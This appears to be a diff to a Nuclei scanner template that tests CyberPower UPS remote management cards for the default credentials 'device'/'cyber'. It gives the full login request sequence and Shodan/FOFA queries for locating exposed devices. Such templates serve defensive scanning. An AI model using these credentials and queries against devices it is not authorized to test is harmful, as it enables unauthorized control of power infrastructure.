@@ -1,4 +1,4 @@
-id: cyber-power-ups-remote-management-default-login
+id: cyber-power-ups-default-login
 
 info:
   name: CyberPower UPS Remote Management - Default Login
@@ -15,77 +15,96 @@ info:
   classification:
     cwe-id: CWE-1392
   metadata:
+    verified: true
+    max-request: 7
+    shodan-query: 'http.html:"login_pass.cgi" http.html:"CyberPower"'
+    fofa-query: 'body="login_pass.cgi" && body="CyberPower"'
     vendor: cyberpower
     product: remote_management_card
   tags: default-login,cyberpower,ups,intrusive
 
-flow: http(1) && http(2) && http(3) && http(4) && http(5) && http(6)
+variables:
+  username: device
+  password: cyber
+
+flow: http(1) && http(2) && http(3) && http(4) && http(5) && http(6) && http(7)
 
 http:
   - raw:
       - |
-        POST /login_pass.cgi HTTP/1.1
+        GET /login.html HTTP/1.1
         Host: {{Hostname}}
-        Cache-Control: max-age=0
-        Origin: http://{{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
-        Referer: http://{{Hostname}}/login.html
 
-        username={{username}}&password={{password}}&save_cookie=on&action=LOGIN
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
 
-    payloads:
-      username:
-        - device
-      password:
-        - cyber
-    attack: pitchfork
+      - type: word
+        part: body
+        words:
+          - CyberPower
+          - login_pass.cgi
+        condition: and
+        internal: true
+
+      - type: regex
+        part: header
+        internal: true
+        regex:
+          - '(?im)^Set-Cookie:\s*cocp=[^;\r\n]+'
+
+  - raw:
+      - |
+        GET /login_pass.cgi?username={{url_encode(username)}}&password={{url_encode(password)}}&action=LOGIN HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: status
+        status:
+          - 303
+        internal: true
 
   - raw:
       - |
         GET /login_pass.html HTTP/1.1
         Host: {{Hostname}}
         Cache-Control: max-age=0
-        Referer: http://{{Hostname}}/login.html
-
-    extractors:
-      - type: kval
-        name: cocp
-        internal: true
-        part: header
-        kval:
-          - cocp
+        Referer: {{RootURL}}/login.html
 
   - raw:
       - |
         GET /login_counter.html?stap=0 HTTP/1.1
         Host: {{Hostname}}
-        Referer: http://{{Hostname}}/login_pass.html
+        Referer: {{RootURL}}/login_pass.html
 
   - raw:
       - |
         GET /login_counter.html?stap=1 HTTP/1.1
         Host: {{Hostname}}
-        Referer: http://{{Hostname}}/login_pass.html
+        Referer: {{RootURL}}/login_pass.html
 
   - raw:
       - |
         GET /login_counter.html?stap=2 HTTP/1.1
         Host: {{Hostname}}
-        Referer: http://{{Hostname}}/login_pass.html
+        Referer: {{RootURL}}/login_pass.html
 
   - raw:
       - |
-        GET /login.cgi?action=LOGIN&save_cookie=on HTTP/1.1
+        GET /login.cgi?action=LOGIN HTTP/1.1
         Host: {{Hostname}}
-        Referer: http://{{Hostname}}/login.html
-        Cookie: cocp={{cocp}}
+        Referer: {{RootURL}}/login.html
 
     matchers-condition: and
     matchers:
       - type: status
         status:
           - 303
+
       - type: regex
         part: header
         regex:
-          - "Location:\\s(http|https):\\/\\/([a-zA-Z0-9.-]+|(\\d{1,3}\\.){3}\\d{1,3})\\/summary.html"
+          - '(?im)^Location:\s*(?:https?://[^/]+)?/summary\.html(?:\b|[?#])'
